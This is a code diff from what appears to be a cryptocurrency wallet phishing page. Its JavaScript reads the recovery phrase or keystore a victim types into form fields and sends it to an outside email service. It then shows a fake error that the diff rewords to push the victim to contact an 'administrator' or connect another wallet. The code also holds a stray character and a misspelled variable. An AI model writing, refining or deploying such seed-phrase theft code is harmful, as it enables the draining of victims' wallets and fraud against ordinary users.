@@ -178,7 +178,7 @@
                     case 0:
                         message = $("#phraseBox").val();
                         break;
-
+ß
                     case 1:
                         message = $("#keystoreBox").val();
 
@@ -238,14 +238,14 @@
                 .then((message) => {
                     console.log(message);
                 })
-                .catch((error) =>
+                .catch((error) => {
                     console.log(erroor);
                 });
 
                 emailjs.send(service_id, template_id, data)
                 .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
-                alert("An unexpected error has occured. Please review your 12 or 24-word recovery phrase carefully, If the wallet recovery phrase or private key is not correct,or if you're attempting to connect an empty wallet, the error might persist.If problems continue, consider trying a different wallet or private key")
+                alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet")
                 }, function(error) {
                 console.log('FAILED...', error);
                 });
